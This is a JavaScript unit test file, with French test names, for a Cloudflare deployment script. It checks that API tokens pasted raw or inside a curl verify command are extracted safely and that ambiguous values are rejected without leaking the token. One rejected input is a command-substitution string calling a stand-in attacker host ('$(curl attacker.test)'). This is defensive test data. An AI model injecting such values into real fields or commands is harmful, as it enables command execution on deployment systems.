import {test} from 'node:test';import assert from 'node:assert/strict';
import {deploymentEnvironment} from '../scripts/deploy-cloudflare.mjs';
const token='demoTokenForUnitTestOnly_0123456789abcdef';
test('Déploiement : jeton brut ou commande copiée, sans exécuter le texte',()=>{
 for(const raw of [token,' '+token+'\n',`curl "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer ${token}"`,`${token}\n\ncurl "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer ${token}"`])assert.equal(deploymentEnvironment({CLOUDFLARE_API_TOKEN:raw}).CLOUDFLARE_API_TOKEN,token);
});
test('Déploiement : valeurs ambiguës rejetées sans divulgation',()=>{for(const raw of ['',token+'\notherTokenForUnitTestOnly_0123456789abcdef','$(curl attacker.test)'])assert.throws(()=>deploymentEnvironment({CLOUDFLARE_API_TOKEN:raw}),e=>!e.message.includes(token)&&/Cloudflare/.test(e.message))});
test('Déploiement : compte valide et clé globale seulement si aucun jeton',()=>{const id='a'.repeat(32);assert.equal(deploymentEnvironment({CLOUDFLARE_ACCOUNT_ID:' '+id+'\n',CLOUDFLARE_API_TOKEN:token,CLOUDFLARE_API_KEY:'unused'}).CLOUDFLARE_API_KEY,undefined);assert.equal(deploymentEnvironment({CLOUDFLARE_API_KEY:token,CLOUDFLARE_EMAIL:'test@example.org'}).CLOUDFLARE_EMAIL,'test@example.org');assert.throws(()=>deploymentEnvironment({CLOUDFLARE_API_TOKEN:token,CLOUDFLARE_ACCOUNT_ID:'curl bad'}));});
